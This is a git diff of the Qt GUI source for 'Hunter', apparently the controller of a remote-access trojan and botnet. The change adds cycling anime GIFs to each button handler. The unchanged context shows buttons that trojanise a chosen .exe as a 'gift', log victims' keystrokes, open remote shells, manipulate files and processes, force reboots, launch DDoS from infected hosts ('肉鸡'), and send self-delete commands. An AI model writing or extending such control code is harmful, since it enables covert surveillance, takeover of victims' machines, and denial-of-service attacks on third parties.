@@ -1,6 +1,10 @@
 #include "hunter.h"
 #include "ui_hunter.h"
 
+
+// 动画计数
+static int movieCount;
+
 Hunter::Hunter(QWidget *parent)
     : QWidget(parent)
     , ui(new Ui::Hunter)
@@ -15,13 +19,20 @@ Hunter::Hunter(QWidget *parent)
     // 总设置区
     ui->widgetOption->setFixedHeight(200);
 
-    // 图片区
+    // 动画区设置
+    movieCount = 0; // 计数初始化为0
+    movies[0] = new QMovie(":/Icons/sylm.gif");
+    movies[1] = new QMovie(":/Icons/lze.gif");
+    movies[2] = new QMovie(":/Icons/sylmm.gif");
+    movies[3] = new QMovie(":/Icons/syy.gif");
+    movies[0]->start();
+    movies[1]->start();
+    movies[2]->start();
+    movies[3]->start();
+    // label显示第一个动图
     ui->labelSister->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
-//    ui->labelSister->setContentsMargins(0, 6, 0, 6);
     ui->labelSister->setText("");
-    QMovie *movie = new QMovie(":/Icons/lze.gif");
-    movie->start();
-    ui->labelSister->setMovie(movie);
+    ui->labelSister->setMovie(movies[0]);
     ui->labelSister->setScaledContents(true);
 
     // 按键区
@@ -112,6 +123,10 @@ Hunter::Hunter(QWidget *parent)
 
     // hunter服务器开关
     connect(ui->btSwitch, &QPushButton::clicked, this, [=](){
+
+        // 更改动画 嘿嘿
+        changeMovie();
+
         if (mCook->GetTcpServer()->server()->isListening()) {
             mCook->stop();
             ui->btSwitch->setText("启动hunter");
@@ -135,6 +150,10 @@ Hunter::Hunter(QWidget *parent)
 
     // 制作礼品开关
     connect(ui->btGenerate, &QPushButton::clicked, this, [=](){
+
+        // 更改动画 嘿嘿
+        changeMovie();
+
         // 原始文件文件
         QString fileName = QFileDialog::getOpenFileName(this, "主人，请选择礼物的原材料哟~", "./", "(*.exe)");
 
@@ -208,6 +227,10 @@ Hunter::Hunter(QWidget *parent)
 
     // 对食物发送弹窗
     connect(ui->btSendBox, &QPushButton::clicked, this, [=](){
+
+        // 更改动画 嘿嘿
+        changeMovie();
+
         // 获取当前用户id
         int id = curFoodIdInTbl();
         if (id != -1)
@@ -232,6 +255,10 @@ Hunter::Hunter(QWidget *parent)
 
     // 强制食物重启
     connect(ui->btReboot, &QPushButton::clicked, this, [=](){
+
+        // 更改动画 嘿嘿
+        changeMovie();
+
         // 获取当前用户id
         int id = curFoodIdInTbl();
         if (id != -1)
@@ -253,6 +280,10 @@ Hunter::Hunter(QWidget *parent)
 
     // 强制食物下线
     connect(ui->btOffline, &QPushButton::clicked, this, [=](){
+
+        // 更改动画 嘿嘿
+        changeMovie();
+
         // 获取当前用户id
         int id = curFoodIdInTbl();
         if (id != -1)
@@ -274,6 +305,10 @@ Hunter::Hunter(QWidget *parent)
 
     // 监听键盘数据
     connect(ui->btKeybd, &QPushButton::clicked, this, [=](){
+
+        // 更改动画 嘿嘿
+        changeMovie();
+
         int id = curFoodIdInTbl();
         if (id != -1) {
             Keybd *ks = new Keybd();
@@ -287,6 +322,10 @@ Hunter::Hunter(QWidget *parent)
 
     // 启动远程shell
     connect(ui->btShell, &QPushButton::clicked, this, [=](){
+
+        // 更改动画 嘿嘿
+        changeMovie();
+
         int id = curFoodIdInTbl();
         if (id != -1){
             Shell *sh = new Shell();
@@ -300,6 +339,10 @@ Hunter::Hunter(QWidget *parent)
 
     // 启动文件操作模块
     connect(ui->btFile, &QPushButton::clicked, this, [=](){
+
+        // 更改动画 嘿嘿
+        changeMovie();
+
         int id = curFoodIdInTbl();
         if (id != -1) {
             File *fl = new File();
@@ -313,6 +356,10 @@ Hunter::Hunter(QWidget *parent)
 
     // 启动进程管理模块
     connect(ui->btProcess, &QPushButton::clicked, this, [=](){
+
+        // 更改动画 嘿嘿
+        changeMovie();
+
         int id = curFoodIdInTbl();
         if(id != -1){
             Proc *pr = new Proc();
@@ -326,6 +373,9 @@ Hunter::Hunter(QWidget *parent)
 
     // 启动ddos模块
     connect(ui->btDDos, &QPushButton::clicked, this, [=](){
+
+        // 更改动画 嘿嘿
+        changeMovie();
 
         int id = ui->tableOnline->rowCount();
         if (id != 0)
@@ -353,13 +403,16 @@ Hunter::Hunter(QWidget *parent)
         }
         else
         {
-            QMessageBox::information(this,"Fail","尊敬的主人，DDOS需要食物呀");
+//            QMessageBox::information(this,"Fail","尊敬的主人，DDOS需要食物呀");
             qDebug() << "DDOS 需要肉鸡的,亲";
         }
     });
 
     // 发送自删除命令
     connect(ui->btDelete, &QPushButton::clicked, this, [=](){
+
+        // 更改动画 嘿嘿
+        changeMovie();
 
         int id = curFoodIdInTbl();
         if(id != -1){
@@ -487,4 +540,10 @@ QString Hunter::ipLocation(QString ip)
     city.indexIn(html);
     Location=city.cap(1);
     return Location;
+}
+
+void Hunter::changeMovie(){
+    movieCount = (movieCount + 1) % 4; // 改变计数
+    // 设置动画
+    ui->labelSister->setMovie(movies[movieCount]);
 }
